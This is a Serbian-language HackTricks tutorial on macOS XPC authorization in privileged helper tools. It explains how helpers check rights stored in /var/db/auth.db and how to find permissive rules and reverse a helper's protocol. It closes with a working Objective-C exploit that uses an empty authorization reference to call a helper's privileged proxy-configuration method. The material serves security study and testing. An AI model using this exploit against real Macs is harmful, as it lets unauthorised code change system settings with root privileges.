# macOS XPC Authorization

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## XPC Authorization

Apple takođe predlaže još jedan način za autentifikaciju ako povezani proces ima **dozvole da pozove izloženu XPC metodu**.

Kada aplikacija treba da **izvrši radnje kao privilegovani korisnik**, umesto da pokreće aplikaciju kao privilegovanog korisnika, obično instalira kao root HelperTool kao XPC servis koji se može pozvati iz aplikacije da izvrši te radnje. Međutim, aplikacija koja poziva servis treba da ima dovoljno autorizacije.

### ShouldAcceptNewConnection uvek DA

Primer se može naći u [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). U `App/AppDelegate.m` pokušava da **poveže** sa **HelperTool**. A u `HelperTool/HelperTool.m` funkcija **`shouldAcceptNewConnection`** **neće proveriti** nijedan od prethodno navedenih zahteva. Uvek će vraćati DA:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Za više informacija o tome kako pravilno konfigurisati ovu proveru:

{% content-ref url="macos-xpc-connecting-process-check/" %}
[macos-xpc-connecting-process-check](macos-xpc-connecting-process-check/)
{% endcontent-ref %}

### Prava aplikacije

Međutim, postoji neka **autorizacija koja se dešava kada se pozove metoda iz HelperTool-a**.

Funkcija **`applicationDidFinishLaunching`** iz `App/AppDelegate.m` će kreirati praznu autorizacionu referencu nakon što aplikacija počne. Ovo bi uvek trebalo da funkcioniše.\
Zatim, pokušaće da **doda neka prava** toj autorizacionoj referenci pozivajući `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Funkcija `setupAuthorizationRights` iz `Common/Common.m` će sačuvati prava aplikacije u bazi podataka auth `/var/db/auth.db`. Obratite pažnju da će dodati samo prava koja još nisu u bazi podataka:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Funkcija `enumerateRightsUsingBlock` se koristi za dobijanje dozvola aplikacija, koje su definisane u `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Ovo znači da će na kraju ovog procesa, dozvole deklarisane unutar `commandInfo` biti sačuvane u `/var/db/auth.db`. Obratite pažnju da možete pronaći za **svaku metodu** koja će r**equirati autentifikaciju**, **ime dozvole** i **`kCommandKeyAuthRightDefault`**. Potonji **ukazuje ko može dobiti ovo pravo**.

Postoje različiti opsezi koji ukazuju ko može pristupiti pravu. Neki od njih su definisani u [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h) (možete pronaći [sve njih ovde](https://www.dssw.co.uk/reference/authorization-rights/)), ali kao sažetak:

<table><thead><tr><th width="284.3333333333333">Ime</th><th width="165">Vrednost</th><th>Opis</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Bilo ko</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Niko</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Trenutni korisnik treba da bude admin (unutar admin grupe)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Traži od korisnika da se autentifikuje.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Traži od korisnika da se autentifikuje. Mora biti admin (unutar admin grupe)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Specifikujte pravila</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Specifikujte neke dodatne komentare o pravu</td></tr></tbody></table>

### Provera prava

U `HelperTool/HelperTool.m` funkcija **`readLicenseKeyAuthorization`** proverava da li je pozivalac autorizovan da **izvrši takvu metodu** pozivajući funkciju **`checkAuthorization`**. Ova funkcija će proveriti da li **authData** poslata od strane pozivnog procesa ima **ispravan format** i zatim će proveriti **šta je potrebno da se dobije pravo** da se pozove specifična metoda. Ako sve prođe dobro, **vraćena `error` će biti `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Napomena da da bi se **proverili zahtevi za dobijanje prava** da se pozove ta metoda, funkcija `authorizationRightForCommand` će samo proveriti prethodno komentarisani objekat **`commandInfo`**. Zatim će pozvati **`AuthorizationCopyRights`** da proveri **da li ima prava** da pozove funkciju (napomena da zastavice omogućavaju interakciju sa korisnikom).

U ovom slučaju, da bi se pozvala funkcija `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` je definisan kao `@kAuthorizationRuleClassAllow`. Tako da **svako može da je pozove**.

### DB Informacije

Pomenuto je da se ove informacije čuvaju u `/var/db/auth.db`. Možete nabrojati sve sačuvane pravila sa:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Zatim, možete pročitati ko može pristupiti pravu sa:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permisivne privilegije

Možete pronaći **sve konfiguracije dozvola** [**ovde**](https://www.dssw.co.uk/reference/authorization-rights/), ali kombinacije koje neće zahtevati interakciju korisnika bi bile:

1. **'authenticate-user': 'false'**
* Ovo je najdirektnija ključ. Ako je postavljeno na `false`, to označava da korisnik ne mora da pruži autentifikaciju da bi dobio ovo pravo.
* Ovo se koristi u **kombinaciji sa jednim od 2 ispod ili označavanjem grupe** kojoj korisnik mora pripadati.
2. **'allow-root': 'true'**
* Ako korisnik radi kao root korisnik (koji ima povišene privilegije), i ovaj ključ je postavljen na `true`, root korisnik bi potencijalno mogao dobiti ovo pravo bez dalјe autentifikacije. Međutim, obično, dobijanje statusa root korisnika već zahteva autentifikaciju, tako da ovo nije scenario "bez autentifikacije" za većinu korisnika.
3. **'session-owner': 'true'**
* Ako je postavljeno na `true`, vlasnik sesije (trenutno prijavljeni korisnik) bi automatski dobio ovo pravo. Ovo bi moglo zaobići dodatnu autentifikaciju ako je korisnik već prijavljen.
4. **'shared': 'true'**
* Ovaj ključ ne dodeljuje prava bez autentifikacije. Umesto toga, ako je postavljen na `true`, to znači da, jednom kada je pravo autentifikovano, može se deliti među više procesa bez potrebe da se svaki ponovo autentifikuje. Ali inicijalno dodeljivanje prava bi i dalje zahtevalo autentifikaciju osim ako nije kombinovano sa drugim ključevima kao što su `'authenticate-user': 'false'`.

Možete [**koristiti ovaj skript**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) da dobijete zanimljiva prava:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## Obrtanje autorizacije

### Proveravanje da li se koristi EvenBetterAuthorization

Ako pronađete funkciju: **`[HelperTool checkAuthorization:command:]`** verovatno je da proces koristi prethodno pomenutu šemu za autorizaciju:

<figure><img src="../../../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

Ako ova funkcija poziva funkcije kao što su `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, koristi [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Proverite **`/var/db/auth.db`** da vidite da li je moguće dobiti dozvole za pozivanje neke privilegovane akcije bez interakcije korisnika.

### Protokol komunikacije

Zatim, potrebno je pronaći šemu protokola kako biste mogli uspostaviti komunikaciju sa XPC servisom.

Funkcija **`shouldAcceptNewConnection`** ukazuje na protokol koji se izlaže:

<figure><img src="../../../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

U ovom slučaju, imamo isto kao u EvenBetterAuthorizationSample, [**proverite ovu liniju**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Znajući ime korišćenog protokola, moguće je **izvršiti dump njegove definicije zaglavlja** sa:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Na kraju, samo treba da znamo **ime izloženog Mach servisa** kako bismo uspostavili komunikaciju s njim. Postoji nekoliko načina da to saznamo:

* U **`[HelperTool init]`** gde možete videti Mach servis koji se koristi:

<figure><img src="../../../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

* U launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

U ovom primeru je kreirano:

* Definicija protokola sa funkcijama
* Prazna autentifikacija koja se koristi za traženje pristupa
* Veza sa XPC servisom
* Poziv funkcije ako je veza bila uspešna
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Ostali XPC privilegijski pomagači koji su zloupotrebljeni

* [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm\_source=pocket\_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm\_source=pocket\_shared)

## Reference

* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
